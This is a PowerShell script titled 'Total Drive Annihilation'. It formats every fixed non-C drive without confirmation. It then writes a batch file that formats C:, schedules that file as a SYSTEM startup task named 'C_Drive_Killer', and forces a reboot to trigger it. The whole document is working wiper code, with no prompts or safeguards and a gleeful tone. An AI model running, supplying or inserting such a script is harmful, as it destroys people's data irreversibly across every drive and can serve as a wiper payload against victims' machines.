<#
.SYNOPSIS
Total Drive Annihilation - Permanent Data Destruction
#>

# ===== CONFIG =====
$WipePasses = 1  # Set to 3 for DoD 5220.22-M compliance (slower)
$NonC_Drives = Get-Partition | Where-Object { 
    $_.DriveLetter -and 
    $_.DriveLetter -ne 'C' -and 
    (Get-Volume -DriveLetter $_.DriveLetter).DriveType -eq 'Fixed'
} | Select-Object -ExpandProperty DriveLetter

# ===== FUNCTIONS =====
function Invoke-TotalWipe {
    param([string]$DriveLetter)
    try {
        # Full format with zero overwrite (quick but thorough)
        Write-Host "[!] NUKE INITIATED ON DRIVE $DriveLetter"
        Format-Volume -DriveLetter $DriveLetter -FileSystem NTFS -Force -Confirm:$false -NumberOfPasses $WipePasses
        Write-Host "[✓] DRIVE $DriveLetter ERASED" -ForegroundColor Green
    } catch {
        Write-Host "[X] FAILED TO WIPE $DriveLetter : $_" -ForegroundColor Red
    }
}

# ===== MAIN EXECUTION =====
Write-Host "=== TOTAL DATA ANNIHILATION ===" -ForegroundColor Red

# ---- PHASE 1: DESTROY NON-C DRIVES ----
foreach ($Drive in $NonC_Drives) {
    Invoke-TotalWipe -DriveLetter $Drive
}

# ---- PHASE 2: SCHEDULE C: DESTRUCTION ----
if (Get-Partition -DriveLetter 'C' -ErrorAction SilentlyContinue) {
    Write-Host "[!] PREPARING C: DRIVE EXECUTION" -ForegroundColor Yellow

    # Create a suicide script for C: (runs at startup)
    $KillScript = @'
@echo off
timeout /t 5 > nul
echo WIPING C: DRIVE...
format C: /FS:NTFS /P:1 /Y > nul
shutdown /s /t 0
'@
    $ScriptPath = "$env:Temp\killc.cmd"
    $KillScript | Out-File -FilePath $ScriptPath -Force

    # Schedule it to run at next boot
    schtasks /create /tn "C_Drive_Killer" /tr "$ScriptPath" /sc ONSTART /ru SYSTEM /f | Out-Null

    # ---- PHASE 3: FORCE RESTART ----
    Write-Host "[!] REBOOTING TO FINISH C: DRIVE..." -ForegroundColor Magenta
    Restart-Computer -Force
}

# ---- FINAL MESSAGE (only seen if C: wipe fails) ----
Write-Host @"

=== MISSION COMPLETE ===
- All non-C drives: ERASED
- C: drive: SCHEDULED FOR DESTRUCTION ON REBOOT
- System will SHUT DOWN after C: is wiped

(╯°□°)╯︵ ┻━┻  GOODBYE!
"@ -ForegroundColor Cyan